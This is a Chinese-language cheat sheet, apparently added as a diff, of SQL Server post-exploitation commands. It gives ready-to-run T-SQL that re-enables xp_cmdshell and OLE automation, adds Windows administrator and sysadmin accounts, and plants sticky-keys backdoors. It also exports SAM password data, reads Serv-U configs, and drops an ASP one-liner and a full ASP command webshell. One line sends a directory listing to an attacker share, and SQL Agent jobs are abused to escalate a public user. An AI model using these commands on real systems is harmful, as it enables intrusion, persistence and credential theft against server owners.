@@ -1,0 +1,325 @@
+1 未能找到存储过程'master..xpcmdshell'.  EXEC master.dbo.sp_addextendedproc 后用下面的三种方法,在注入点上执行加个空格和;号
+恢复方法：查询分离器连接后,
+第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
+第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
+然后按F5键命令执行完毕
+
+2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
+恢复方法：查询分离器连接后,
+第一步执行：EXEC master.dbo.sp_dropextendedproc "xp_cmdshell"
+第二步执行：EXEC master.dbo.sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+然后按F5键命令执行完毕
+
+3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+恢复方法：查询分离器连接后,
+第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
+第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'       
+然后按F5键命令执行完毕
+
+4 终极方法.
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
+查询分离器连接后,
+2000servser系统:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user 新用户 密码 /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators 新用户 /add'
+
+xp或2003server系统:
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 新用户 密码 /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 新用户 /add'
+
+
+五个SHIFT
+declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+
+declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe'; 
+
+xp_cmdshell执行命令另一种方法
+declare @a sysname set @a='xp_'+'cmdshell' exec @a 'net user refdom 123456 /add' 
+
+判断存储扩展是否存在
+Select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'
+返回结果为1就OK
+
+
+上传xplog70.dll恢复xp_cmdshell语句:
+sp_addextendedproc xp_cmdshell,@dllname='E:\newche2\about\XPLOG70.DLL'
+
+否则上传xplog7.0.dll
+Exec master.dbo.addextendedproc 'xp_cmdshell','C:\WinNt\System32\xplog70.dll'
+
+
+
+首先开启沙盘模式：
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+然后利用jet.oledb执行系统命令
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin1234 /add")')
+返回 不能找到c:\windows\system32\ias\ias.mdb错误,用exec master..xp_dirtree 'c:\windows\system32\ias\ias',1,1--  发现c:\windows\system32\ias\ias.mdb没了,应该是被管理员删掉了,还有另一个mdb也没了
+
+
+
+恢复过程sp_addextendedproc 如下： 
+create procedure sp_addextendedproc --- 1996/08/30 20:13 
+@functname nvarchar(517),/* (owner.)name of function to call */ 
+@dllname varchar(255)/* name of DLL containing function */ 
+as 
+set implicit_transactions off 
+if @@trancount > 0 
+begin 
+raiserror(15002,-1,-1,'sp_addextendedproc') 
+return (1) 
+end 
+dbcc addextendedproc( @functname, @dllname) 
+return (0) -- sp_addextendedproc 
+GO 
+
+
+
+导出管理员密码文件
+sa默认可以读sam键.应该。
+reg export HKLM\SAM\SAM\Domains\Account\Users\000001F4 c:\old.reg
+net user administrator test
+用administrator登陆.
+用完机器后
+reg import c:\test.reg
+根本不用克隆.
+找到对应的sid. 
+
+
+
+恢复所有存储过程
+use master 
+exec sp_addextendedproc xp_enumgroups,'xplog70.dll' 
+exec sp_addextendedproc xp_fixeddrives,'xpstar.dll' 
+exec sp_addextendedproc xp_loginconfig,'xplog70.dll' 
+exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll' 
+exec sp_addextendedproc xp_getfiledetails,'xpstar.dll' 
+exec sp_addextendedproc sp_OACreate,'odsole70.dll' 
+exec sp_addextendedproc sp_OADestroy,'odsole70.dll' 
+exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll' 
+exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll' 
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll' 
+exec sp_addextendedproc sp_OASetProperty,'odsole70.dll' 
+exec sp_addextendedproc sp_OAStop,'odsole70.dll' 
+exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll' 
+exec sp_addextendedproc xp_regdeletekey,'xpstar.dll' 
+exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll' 
+exec sp_addextendedproc xp_regenumvalues,'xpstar.dll' 
+exec sp_addextendedproc xp_regread,'xpstar.dll' 
+exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll' 
+exec sp_addextendedproc xp_regwrite,'xpstar.dll' 
+exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
+
+
+建立读文件的存储过程
+Create proc sp_readTextFile @filename sysname
+as
+
+    begin 
+    set nocount on 
+    Create table #tempfile (line varchar(8000))
+    exec ('bulk insert #tempfile from "' + @filename + '"')
+    select * from #tempfile
+    drop table #tempfile
+End
+
+exec sp_readTextFile 'D:\testjun17\Teleweb-Japan\default.asp' 利用建立的存储过程读文件
+查看登录用户
+Select * from sysxlogins
+
+把文件内容读取到表中
+BULK INSERT tmp from "c:\test.txt"
+dElete from 表名 清理表里的内容
+create table b_test(fn nvarchar(4000));建一个表,字段为fn
+
+
+加sa用户
+exec master.dbo.sp_addlogin user,pass;
+exec master.dbo.sp_addsrvrolemember user,sysadmin
+
+
+
+读文件代码
+declare @o int, @f int, @t int, @ret int
+declare @line varchar(8000)
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'opentextfile', @f out, '文件名', 1
+exec @ret = sp_oamethod @f, 'readline', @line out
+while( @ret = 0 )
+begin
+print @line
+exec @ret = sp_oamethod @f, 'readline', @line out
+end
+
+
+写文件代码：
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'd:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL, 《内容》
+
+
+添加lake2 shell
+sp_addextendedproc 'xp_lake2', 'c:\recycler\xplake2.dll'
+sp_dropextendedproc xp_lake2
+EXEC xp_lake2 'net user'
+
+
+得到硬盘文件信息 
+--参数说明:目录名,目录深度,是否显示文件 
+execute master..xp_dirtree 'c:' 
+execute master..xp_dirtree 'c:',1 
+execute master..xp_dirtree 'c:',1,1 
+
+
+读serv-u配置信息
+exec sp_readTextFile 'd:\Program Files\RhinoSoft.com\Serv-U\ReadMe.txt'
+exec sp_readTextFile 'd:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini'
+
+通过xp_regwrite写SHIFT后门
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_sz','c:\windows\system32\cmd.exe on';--
+
+
+
+找到web路径然后用exec master.dbo.xp_subdirs 'd:\web\www.xx.com';
+exec sp_makewebtask 'd:\web\www.XXXX.com\XX.asp','select''<%execute(request("SB"))%>'' '备 份一个小马就可以了
+
+EXECUTE sp_makewebtask @outputfile = ‘WEB绝对路径\导出的文件名.asp',@query = 'SELECT 你的字段 FROM 你建的临时表'
+
+
+
+sql server 2005下开启xp_cmdshell的办法
+
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+SQL2005开启'OPENROWSET'支持的方法：
+
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+
+SQL2005开启'sp_oacreate'支持的方法:
+
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+以下方面不知道能不能成功暂且留下研究哈:
+4)
+use msdb; --这儿不要是master哟
+exec sp_add_job @job_name= czy82 ;
+exec sp_add_jobstep @job_name= czy82 ,@step_name = Exec my sql ,@subsystem= CMDEXEC ,@command= dir c:\>c:\b.txt ;
+exec sp_add_jobserver @job_name = czy82 ,@server_name = smscomputer ;
+exec sp_start_job @job_name= czy82 ;
+
+利用MSSQL的作业处理也是可以执行命令的而且如果上面的subsystem的参数是tsql，后面的我们就可以
+执行tsql语句了.
+对于这几个储存过程的使用第一在@server_name我们要指定你的sql的服务器名
+第二系统的sqlserveragent服务必须打开(默认没打开的气人了吧)
+net start SQLSERVERAGENT
+
+对于这个东东还有一个地方不同就是public也可以执行..同这儿也是有系统洞洞的看下面的
+USE msdb
+EXEC sp_add_job @job_name = GetSystemOnSQL ,
+@enabled = 1,
+@description = This will give a low privileged user access to
+xp_cmdshell ,
+@delete_level = 1
+EXEC sp_add_jobstep @job_name = GetSystemOnSQL ,
+@step_name = Exec my sql ,
+@subsystem = TSQL ,
+@command = exec master..xp_execresultset N select exec
+master..xp_cmdshell "dir > c:\agent-job-results.txt" ,N Master 
+EXEC sp_add_jobserver @job_name = GetSystemOnSQL ,
+@server_name = 你的SQL的服务器名 
+EXEC sp_start_job @job_name = GetSystemOnSQL 
+
+不要怀疑上面的代码，我是测试成功了的!这儿我们要注意xp_execresultset就是因为它所以
+才让我们可以以public执行xp_cmdshell
+
+5)关于Microsoft SQL Agent Jobs任意文件可删除覆盖漏洞(public用户也可以)
+在安焦有文章:http://www.xfocus.net/vuln/vul_view.php?vul_id=2968
+
+USE msdb
+EXEC sp_add_job @job_name = ArbitraryFilecreate ,
+@enabled = 1,
+@description = This will create a file called c:\sqlafc123.txt ,
+@delete_level = 1
+EXEC sp_add_jobstep @job_name = ArbitraryFilecreate ,
+@step_name = SQLAFC ,
+@subsystem = TSQL ,
+@command = select hello, this file was created by the SQL Agent. ,
+@output_file_name = c:\sqlafc123.txt 
+EXEC sp_add_jobserver @job_name = ArbitraryFilecreate ,
+@server_name = SERVER_NAME 
+EXEC sp_start_job @job_name = ArbitraryFilecreate 
+
+如果subsystem选的是:tsql，在生成的文件的头部有如下内容
+
+??揂rbitraryFilecreate? ? 1 ?,揝QLAFC? ???? 2003-02-07 18:24:19
+----------------------------------------------
+hello, this file was created by the SQL Agent.
+
+(1 ?????)
+
+所以我建议要生成文件最好subsystem选cmdexec,如果利用得好我们可以写一个有添加管理员
+命令的vbs文件到启动目录!
+
+6)关于sp_makewebtask(可以写任意内容任意文件名的文件)
+关于sp_MScopyscriptfile 看下面的例子
+declare @command varchar(100) 
+declare @scripfile varchar(200) 
+set concat_null_yields_null off 
+select @command= dir c:\ > "\\attackerip\share\dir.txt" 
+select @scripfile= c:\autoexec.bat > nul" | @command | rd " 
+exec sp_MScopyscriptfile @scripfile , 
+
+这两个东东都还在测试试哟
+让MSSQL的public用户得到一个本机的web shell:)
+
+sp_makewebtask @outputfile= d:\sms\a.asp ,@charset=gb2312,
+--@query= select <img src=vbscript:msgbox(now())> 
+--@query= select <%response.write request.servervariables("APPL_PHYSICAL_PATH")%> 
+@query= select 
+<%On Error Resume Next 
+Set oscript = Server.createObject("wscript.SHELL") 
+Set oscriptNet = Server.createObject("wscript.NETWORK") 
+Set oFileSys = Server.createObject("scripting.FileSystemObject") 
+szCMD = Request.Form(".CMD") 
+If (szCMD <>"")Then 
+szTempFile = "C:\" & oFileSys.GetTempName() 
+Call oscript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) 
+Set oFile = oFilesys.OpenTextFile (szTempFile, 1, False, 0) 
+End If %> 
+<HTML><BODY><FORM action="<%= Request.ServerVariables("URL")%>" method="POST"> 
+<input type=text name=".CMD" size=45 value="<%= szCMD %>"><input type=submit value="Run"> 
+</FORM><PRE> 
+<% If (IsObject(oFile))Then 
+On Error Resume Next 
+Response.Write Server.HTMLEncode(oFile.ReadAll) 
+oFile.Close 
+Call oFileSys.deleteFile(szTempFile, True) 
+End If%> 
+</BODY></HTML> 
